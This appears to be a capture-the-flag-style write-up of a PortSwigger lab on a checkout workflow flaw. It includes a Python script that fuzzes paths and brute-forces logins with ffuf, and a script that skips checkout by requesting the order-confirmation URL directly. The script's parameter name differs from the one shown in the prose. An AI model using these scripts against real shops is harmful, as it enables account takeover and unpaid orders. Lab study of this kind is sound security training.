--- 
title: "Insufficient Workflow Validation"
author: ""
date: 2024-06-01T18:05:56+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
#### Entities
Asset: https://0a34004a0445591182d31a2900a00014.web-security-academy.net

#### Enumeration
Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page enumerating for paths with the script below.

```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import subprocess
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_session_cookie(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  session_cookie = response.cookies.get('session')
  return csrf_token, session_cookie

def check_binary(binary_name):
  if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
    command = ['which', binary_name]
  elif sys.platform.startswith('win'):
    command = ['where', binary_name]
  else:
    print("Unsupported operating system")
    return

  try:
    subprocess.check_output(command)
    return True
  except subprocess.CalledProcessError:
    print(f"{binary_name} is not installed.")
    return False

def install_binary(binary_url, binary_name):
  os_name = platform.system().lower()
  binary_file = f"{binary_name}.zip" if os_name == 'windows' else f"{binary_name}.tar.gz"
  
  # Check if binary exists
  if not check_binary(binary_name):
    # Download Binary File if not exist
    if not os.path.exists(binary_file):
      if os_name == 'linux':
        download_command = f"curl -L {binary_url}_linux_amd64.tar.gz -o {binary_file}"
      elif os_name == 'darwin':
        download_command = f"curl -L {binary_url}_macOS_amd64.tar.gz -o {binary_file}"
      elif sys.platform.startswith('win'):
        download_command = f"powershell -Command 'Invoke-WebRequest {binary_url}_windows_amd64.zip -OutFile {binary_file}'"
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(download_command, shell=True, check=True)
        print(f"{binary_name} downloaded successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to download {binary_name}: {e}")

    # Install Binary
    if os.path.exists(binary_file):
      if os_name in ['linux', 'darwin']:
        extract_command = f"sudo tar -C /usr/local/bin/ -xzf {binary_file} {binary_name} && sudo chmod 775 /usr/local/bin/{binary_name}"
      elif sys.platform.startswith('win'):
        extract_command = f"Powershell -Command \"Expand-Archive -Path {binary_file} -DestinationPath . ; Move-Item -Path .\\{binary_name}.exe -Destination 'C:\\Windows\\'\""
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(extract_command, shell=True, check=True)
        print(f"{binary_name} installed successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to install {binary_name}: {e}")

        # Clean up downloaded binary file
        try:
          cleanup_command = f"rm {binary_file}" if os_name != 'windows' else f"del {binary_file}"
          subprocess.run(cleanup_command, shell=True, check=True)
          print(f"Cleaned up {binary_file}")
        except subprocess.CalledProcessError as e:
          print(f"Failed to clean up {binary_file}: {e}")
  else:
    print(f"{binary_name} is already installed.")

def enumerate(endpoint, wordlist_path, method='GET', data=None, session_cookie=None, fuzz_mode=None):
  print(f"Enumerating paths using {method}")
  if method == 'GET':
    fuzz_command = f"ffuf -s -u {endpoint} -w {wordlist_path} -x https://127.0.0.1:8080 -k"
  elif method == 'POST':
    if data is None:
      print("Data must be provided for POST method")
      return
    fuzz_command = f"ffuf -s --mode {fuzz_mode} -u {endpoint} {' '.join('-w ' + path for path in wordlist_path)} -X POST -d {data} -b session={session_cookie} -x http://127.0.0.1:8080 -mc 302,401-403"
  else:
    print("Unsupported method")
    return

  process = subprocess.Popen(fuzz_command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
  for line in process.stdout:
    print(line.strip())

def main():
  binary_url = "https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0"
  binary_name = "ffuf"
  base_url = "https://0a34004a0445591182d31a2900a00014.web-security-academy.net"
  install_binary(binary_url, binary_name)
  session = requests.Session()
  csrf_token, session_cookie = get_csrf_session_cookie(session, base_url + '/login')
  enumerate(base_url + '/FUZZ', 'wordlist_for_paths.txt')
  enumerate(base_url + '/login', ['wordlist_for_users.txt:USERNAME', 'wordlist_for_passwords.txt:PASSWORD'], method='POST', data=f'csrf={csrf_token}&username=USERNAME&password=PASSWORD', session_cookie=session_cookie, fuzz_mode='clusterbomb')
  
if __name__ == "__main__":
  main()
```
The custom word list used for the path enumeration.
```text
accounts
admin
administrator
api
users
products
product
```
The custom word list used for the username enumeration.
```text
administrator
alex
ben
carlos
jane
micheal
peter
```
The custom word list used for the password enumeration.
```text
administrator
alex
ben
carlos
jane
micheal
peter
```
![Enumeration](/images/bizlogic8/01-enumerate-insufficient-workflow-validation.png "Enumeration")  

#### Exploration
Then stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on,  perform a user flow for purchasing an item after logging in with the provided user credential  `wiener:peter`. Inspect the proxy flow and observe that the `/cart/checkout` path returned a HTTP 303 status to a `Location: /cart/order-confirmation?order-confirmed=true`. This simply implies that checkout step is not validated but a confirmation issued. 

![Exploration](/images/bizlogic8/02-explore-insufficient-workflow-validation.png "Exploration") 

#### Exploitation
Send the POST `/cart` and GET `/cart/order-confirmation?order-confirmed=true` requests to Burp Repeater, Change the productId to `1` and create a Group Tab with `Send group(seperate connections)` selected. With Tab focused on `/cart` request, hit send then navigate to `/cart/order-confirmation?order-confirmed=true` to confirm the purchase. This exploit can be automated with the script below
```python
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SiteInteraction:
  def __init__(self, base_url, proxies=None):
    self.base_url = base_url
    self.session = requests.Session()
    self.session.proxies = proxies if proxies else {}

  def get_csrf_token(self, url):
    response = self.session.get(url, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token
  
  def login(self, username, password):
    login_url = self.base_url + '/login'
    csrf_token = self.get_csrf_token(login_url)
    data = {
      'username': username,
      'password': password,
      'csrf': csrf_token
    }
    response = self.session.post(login_url, data=data, verify=False)
    return response
  
  # Purchase Item
  def purchase_item(self):
    login_response = self.login(username, password)
    if login_response.status_code != 200:
      print("Failed to login.")
      return

    # Add Item to Cart
    cart_url = self.base_url + '/cart'   
    cart_payload = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1'}
    self.session.post(cart_url, data=cart_payload, verify=False)

    # Confirm Purchase
    confirmation_url = self.base_url + '/cart/order-confirmation?order-confirmation=true'  
    response = self.session.get(confirmation_url, verify=False)
    if response.status_code != 200:
      print("Failed to Confirm Order")
      return
    print("Item purchased successfully.")

# Example usage:
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'https://0a34004a0445591182d31a2900a00014.web-security-academy.net'
username = 'wiener'
password = 'peter'
site = SiteInteraction(url, proxies=proxies)
site.purchase_item()  # Purchase Item
```
![Exploitation](/images/bizlogic8/03-exploit-insufficient-workflow-validation.png "Exploitation") 

![Solution](/images/bizlogic8/04-lab-solution.png "Solution")   

#### Resources
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation
- https://github.com/knoxknot/portswigger/tree/main/business-logic/08-insufficient-workflow-validation